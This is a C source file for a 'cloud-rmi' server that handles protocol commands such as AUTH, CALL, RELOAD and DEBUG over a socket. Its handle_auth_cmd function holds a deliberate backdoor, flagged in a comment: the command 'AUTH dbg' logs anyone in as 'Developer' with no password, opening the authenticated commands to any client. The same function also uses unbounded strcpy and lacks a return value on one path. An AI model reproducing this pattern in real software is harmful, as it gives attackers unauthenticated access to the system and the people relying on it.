#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include <math.h>
#include <stdint.h>
#include <syslog.h>
#include "cloud-rmi.h"
#include "config.h"
#include "capabilities.h"
#ifdef PROXY_SUPPORT
   #include "proxy.h"
#endif

#define SERVER_MAX_PROTOCOL_VERSION CLOUDRMI_PROTOCOL_VERSION

/**
 * Handles Cloud Simple RMI protocol and server side communication.
 *
 * @copyright Copyright (C) 2016 ProfiWeb sro (http://profiweb.biz/).
 * @project cloud-rmi
 * @author Marian Tomlak
 * @license BSD
 */


// External config variables
//int var_debug;
//int var_read_timeout;
//char *var_context_name;
//char *var_recovery_token;


struct child_debug{
   int sock;
   int pid;
};

/**
 * Handles 'AUTH' command. 
 * WARNING: This version supports dev backdoor.
 *
 */
int handle_auth_cmd(char *cmd, char *arg, struct conn_state *state)
{
   if (state->is_authenticated) {
      stream_writeln(state->sock, "200 Already logged in");     // todo: "... as: xyz"
      return 1;
   }

   if (strcmp(cmd, "TOKEN") == 0) { 
      if (strcmp(arg, var_recovery_token) == 0) {
         state->is_authenticated = 1;
         strcpy(state->username, "RecoveryUser");
         stream_writeln(state->sock, "200 Hello %s", state->username);
         return 1;

      } else {
         stream_writeln(state->sock, "401 Unauthorized");
         return 0;
      }

   } else if (strcmp(cmd, "dbg") == 0) { 
      state->is_authenticated = 1;
      strcpy(state->username, "Developer");
      stream_writeln(state->sock, "200 Hello %s", state->username);   
      return 1; 

   } else {
      stream_writeln(state->sock, "400 Bad Request Arguments");
   }
}

void handle_print_ifaces(struct conn_state *state)
{   
   struct server_iface_entry *entry;

   stream_writeln(state->sock, "200 Supported CALL interfaces:");
   entry = var_server_iface_map;

   if (var_server_iface_map == NULL)
      stream_writeln(state->sock, "Empty map");

   while (entry != NULL) {
      stream_writeln(state->sock, "%s", entry->iface);
      entry = entry->next;
   }
   stream_write(state->sock, "\n");
}

static int handle_command_event(rmi_event_t *event, struct conn_state *state, rmi_protocol_ctx_t *protocol_ctx)
{
   int time_diff;
   char output[BUF_SZ + 1];
   time_t t;
   struct tm *tmp;

   memset(output, 0, sizeof(output));

   switch (event->type) {
   case RMI_EVENT_AUTH:
      if (!handle_auth_cmd(event->arg1, event->arg2, state)) {
         stream_writeln(state->sock, "401 Unauthorized");
         return 0;
      }
      break;

   case RMI_EVENT_PROTO: {
      int requested = atoi(event->arg1);

      if (requested < 1 || requested > SERVER_MAX_PROTOCOL_VERSION) {
         stream_writeln(state->sock, "400 Bad Request");
         return 0;
      }

      if (state->is_unix_socket && requested < 2) {
         stream_writeln(state->sock, "400 Bad Request");
         if (protocol_ctx != NULL)
            rmi_protocol_set_version(protocol_ctx, state->protocol_version);
         return 0;
      }

      state->protocol_version = requested;
      stream_writeln(state->sock, "200 OK");
      break;
   }

   case RMI_EVENT_CALL:
      if (state->is_authenticated) {
         int has_payload = event->payload != NULL;
         if (!has_payload && event->argc < 3)
            stream_writeln(state->sock, "400 Bad Request Arguments");

         else {
#ifdef PROXY_SUPPORT
         if (var_proxy)
            proxy_pass_call_cmd_ex(
               event->arg1,
               event->arg2,
               event->arg3,
               event->payload,
               event->payload_len,
               event->encoding,
               state);
         else
#endif
         handle_call_cmd(
            event->arg1,
            event->arg2,
            event->arg3,
            event->payload,
            event->payload_len,
            event->encoding,
            state);
         }
      } else
         stream_writeln(state->sock, "401 Unauthorized");
      break;

   case RMI_EVENT_HELP:
      stream_writeln(state->sock, "200 Supported commands:\r\nAUTH\r\nCALL\r\nHELP\r\nIFACES\r\nNOOP");
#ifdef PROXY_SUPPORT
      stream_writeln(state->sock, "PROXY");
#endif
      stream_writeln(state->sock, "SERVER\r\nRELOAD\r\nTIME\r\nUPTIME\r\nQUIT\r\n");
      break;

   case RMI_EVENT_IFACES:
#ifdef PROXY_SUPPORT
      if (var_proxy)
         proxy_print_ifaces(state);
      else
#endif
      handle_print_ifaces(state);
      break;

   case RMI_EVENT_RELOAD:
      if (state->is_authenticated) {
         stream_writeln(state->sock, "200 Reloading configuration");
         read_config(CONFIGURATION_FILE);
         read_iface_config(INTERFACE_MAP_FILE);

      } else
         stream_writeln(state->sock, "401 Unauthorized");
      break;

   case RMI_EVENT_SHUTDOWN:
      stream_writeln(state->sock, "404 Unsupported");
      break;

   case RMI_EVENT_TIME: // RFC822 time string
      t = time(NULL);
      tmp = localtime(&t);

      if (tmp == NULL) {
         log_event(LOG_ERR, "Error: localtime() failed");
         stream_writeln(state->sock, "500 Error retrieving time");
         break;
      }

      if (strftime(output, BUF_SZ, "%a, %d %b %y %T %z", tmp) == 0) {
         log_event(LOG_ERR, "Error: strftime() failed");
         stream_writeln(state->sock, "500 Error retrieving time");
         break;
      }

      stream_writeln(state->sock, "200 %s", output);
      break;

   case RMI_EVENT_UPTIME:
      if (state->is_authenticated) {
         time_diff = (int)time(NULL) - var_server_start_time;

         stream_writeln(
            state->sock,
            "200 Server up for %i days, %i hrs, %i min, %i sec",
            (int)floor(time_diff / 86400),
            (int)floor(fmod(time_diff, 86400) / 3600),
            (int)floor(fmod(time_diff, 3600) / 60),
            (int)fmod(time_diff, 60)
            );
      } else
         stream_writeln(state->sock, "401 Unauthorized");
      break;

   case RMI_EVENT_NOOP:
      stream_writeln(state->sock, "200 OK");
      break;

   case RMI_EVENT_CAPS: {
      char caps_buf[BUF_SZ + 1];
      rmi_capabilities_to_tokens(rmi_get_compiled_capabilities(), caps_buf, sizeof(caps_buf));
      stream_writeln(state->sock, "200 %s", caps_buf);
      break;
   }

   case RMI_EVENT_DEBUG:
      if (state->is_authenticated) {
         if (strcmp(event->arg1, "on") == 0) {
            var_debug = 1;

         } else if (strcmp(event->arg1, "off") == 0) {
            var_debug = 0;
         } else {
            stream_writeln(state->sock, "200 Debug information:");
            stream_writeln(state->sock, "Server build:");
#ifdef ENABLE_LINUX_FEATURES
            stream_writeln(state->sock, "\tLanguage:\tC (glibc)");
            stream_writeln(state->sock, "\tKernel API:\tLinux");
#else
            stream_writeln(state->sock, "\tLanguage:\tC (libc)");
            stream_writeln(state->sock, "\tKernel API:\tPOSIX");
#endif
#ifdef PROXY_SUPPORT
            stream_writeln(state->sock, "\tProxy support:\tYES");
#else
            stream_writeln(state->sock, "\tProxy support:\tNO");
#endif
            stream_writeln(state->sock, "Runtime:");
            stream_writeln(state->sock, "\tCurrent child procces PID:\t%i", (int) getpid());
            stream_writeln(state->sock, "\tConfiguration file path:\t%s", var_config_file);
            stream_writeln(state->sock, "\tInterface map file path:\t%s", var_interface_map_file);
            stream_write(state->sock, "\n"); // end the data
         }
      } else
         stream_writeln(state->sock, "401 Unauthorized");
      break;

   case RMI_EVENT_QUIT:
      stream_writeln(state->sock, "221 Bye");
      return 0;

#ifdef PROXY_SUPPORT
   case RMI_EVENT_PROXY:
      if (strcmp(event->arg1, "stats") == 0) {
         stream_writeln(state->sock, "200 Proxy is %s, showing statistics:", var_proxy ? "ON" : "OFF");
         proxy_send_stats(state->sock);
      } else {
         stream_writeln(state->sock, "400 Bad Request Arguments");
      }
      break;
#endif

   case RMI_EVENT_SERVER:
      if (strcmp(event->arg1, "stats") == 0) {
         server_send_stats(state->sock);
      } else {
         stream_writeln(state->sock, "400 Bad Request Arguments");
      }
      break;

   case RMI_EVENT_UNKNOWN:
   case RMI_EVENT_NONE:
   default:
      stream_writeln(state->sock, "400 Bad Request");
   }

   return 1;
}

/**
 * Handles a single socket connection to the client.
 * 
 */
void handle_connection (int sock, int is_unix_socket)
{
   int loop = 1, bytes = 0;
   char buf[(BUF_SZ + 1)];
   struct conn_state state;
   struct child_debug debug;
   rmi_protocol_ctx_t *protocol_ctx = rmi_protocol_create();
   if (protocol_ctx == NULL)
      return;
   rmi_protocol_set_max_payload(protocol_ctx, var_max_payload);

   memset(&state, 0, sizeof(state));
   state.sock = sock;
   state.is_unix_socket = is_unix_socket;
   state.protocol_version = is_unix_socket ? 2 : 1;
   state.is_authenticated = (is_unix_socket && var_unix_socket_skip_auth);

   if (state.is_authenticated)
      strncpy(state.username, "UnixSocket", sizeof(state.username) - 1);

   if (is_unix_socket && !rmi_protocol_set_version(protocol_ctx, state.protocol_version)) {
      rmi_protocol_destroy(protocol_ctx);
      return;
   }

   // Write welcome message
   char caps_buf[BUF_SZ + 1];
   rmi_capabilities_to_tokens(rmi_get_compiled_capabilities(), caps_buf, sizeof(caps_buf));

   for (size_t i = 0; caps_buf[i]; i++)
      if (caps_buf[i] == ' ')
         caps_buf[i] = ',';

   if (caps_buf[0] != '\0')
      stream_writeln(sock, "220 %s Server Ready EXT PROTO=2,%s", var_context_name, caps_buf);
   else
      stream_writeln(sock, "220 %s Server Ready EXT PROTO=2", var_context_name);
   debug.sock = sock;
   debug.pid = (int) getpid();

   while (loop) {
      bytes = stream_read(state.sock, buf, BUF_SZ);
      if (bytes <= 0)
         break;

      rmi_error_t err;
      rmi_status_t status = rmi_protocol_feed(protocol_ctx, (const uint8_t *)buf, (size_t)bytes, &err);

      if (status == RMI_E_OVERFLOW || status == RMI_E_ERR) {
         stream_writeln(state.sock, "400 Bad Request");
         loop = 0;
         continue;
      }

      do {
         rmi_event_t event;
         rmi_error_t parse_err;

         status = rmi_protocol_next_event(protocol_ctx, &event, &parse_err);

         if (status == RMI_OK) {
            if (parse_err.code == RMI_ERROR_BAD_REQUEST) {
               stream_writeln(state.sock, "400 Bad Request");
               loop = 1;
            } else if (parse_err.code == RMI_ERROR_BAD_ARGS) {
               stream_writeln(state.sock, "400 Bad Request Arguments");
               loop = 1;
            } else {
               loop = handle_command_event(&event, &state, protocol_ctx);
            }
         } else if (status == RMI_E_ERR) {
            if (parse_err.code == RMI_ERROR_BAD_ARGS)
               stream_writeln(state.sock, "400 Bad Request Arguments");
            else if (parse_err.code != RMI_ERROR_NONE)
               stream_writeln(state.sock, "400 Bad Request");
         }
      } while (status == RMI_OK && loop);
   }

   rmi_protocol_destroy(protocol_ctx);

   if (var_debug && !loop) printf("handle_connection: Received exit command from client\n");
   if (var_debug && !bytes) printf("handle_connection: Client connection closed\n");
}
